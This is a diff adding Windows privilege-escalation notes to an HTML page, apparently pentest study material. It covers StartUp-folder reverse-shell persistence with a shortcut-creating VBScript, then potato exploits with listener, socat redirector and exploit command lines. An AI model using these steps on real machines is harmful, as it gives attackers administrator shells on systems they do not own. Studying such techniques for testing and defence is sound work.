@@ -696,6 +696,105 @@
 
     <h2>Startup Apps</h2>
     <li>Program for startup apps that should start for all users (including admin):</li>
+    <ul>
+        <li>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</li>
+        <ul>
+            <li>Directory</li>
+            <li>if we have access, we can add a reverseShell.exe, and when admin logs in we will get a admin priv reverse shell.</li>
+        </ul>
+        <li>Check access to directory with accesschk.exe:</li>
+        <ul>
+            <li>accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"</li>
+        </ul>
+        <li>files in StartUp directory must be shortcuts (.lnk)</li>
+        <ul>
+            <li>VBScript to create a shortcut file:</li>
+            <pre>
+                Set oWS = WScript.CreateObject("WScript.Shell")
+                sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
+                Set oLink = oWS.CreateShortcut(sLinkFile)
+                oLink.TargetPath = "C:\PrivEsc\reverse.exe"
+                oLink.Save
+            </pre>
+        </ul>
+        <li>cmd "cscript CreateShortCut.vbs"</li>
+    </ul>
+
+    <h2>Prilivege Abuse</h2>
+    <li>SeImpersonatePrivilege</li>
+    <ul>
+        <li>Hot Potato</li>
+        <ul>
+            <li>This works on Windows 7, 8, and early versions of 10.</li>
+            <li>It also works on the server counterparts.  Patched on latest Windows 10.  </li>
+            <li>***Does not require SeImpersonatePrivilege.*** like the other potato exploits</li>
+            <li>Other Potato exploits work better and are easier to work with</li>
+            <ul>
+                <li>Instructions</li>
+                <ul>
+                    <li>Get shell with low privilege user account.</li>
+                    <li>Set listener waiting for Potato exploit.  </li>
+                </ul>
+                <li>nc -lvnp 4444</li>
+                <ul>
+                    <li>Run potato.exe on victim machine:</li>
+                    <ul>
+                        <li>potato.exe -ip &lt;victim ip&gt; -cmd &quot;C:\reverse\shell.exe"</li>
+                        <ul>
+                            <li>For windows 7 add to command</li>
+                            <ul>
+                                <li>-enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true</li>
+                            </ul>
+                        </ul>
+                    </ul>
+                </ul>
+            </ul>
+        </ul>
+    </ul>
+    <li>Rotten Potato</li>
+    <ul>
+        <li>Works up until sometime in 2019. </li>
+        <li>Patched on latest Windows 10.</li>
+    </ul>
+    <li>Juicy Potato</li>
+    <ul>
+        <li>Juicy Potato replaced Rotten Potato (works better)</li>
+        <li>Patched on latest Windows 10</li>
+        <li>Instructions:</li>
+        <ul>
+            <li>Get shell w/ SeImpersonatePrivilege Enabled user.</li>
+            <li>Set listener waiting for potato exploit.</li>
+            <li>Execute JuicyPotato.exe on Windows machine</li>
+            <ul>
+                <li>JuicyPotato.exe -l 1337 -p &lt;program&gt; -t * -c &lt;{CLSID}&gt;</li>
+            </ul>
+        </ul>
+    </ul>
+
+    <li>Rogue Potato</li>
+    <ul>
+        <li>May have been patched sometime in 2021</li>
+        <li>More advanced and complicated than previous potato exploits.</li>
+        <li>Instructions</li>
+        <ul>
+            <li>Listener on Kali: sudo socat tcp-listen:135,reuseaddr,fork tcp:&lt;Victim ip address&gt;:9999</li>
+            <li>On victim Windows machine: RoguePotato.exe -r 10.0.0.5 -l 9999 -e "C:\windows\system32\cmd.exe"</li>
+        </ul>
+    </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 </body>
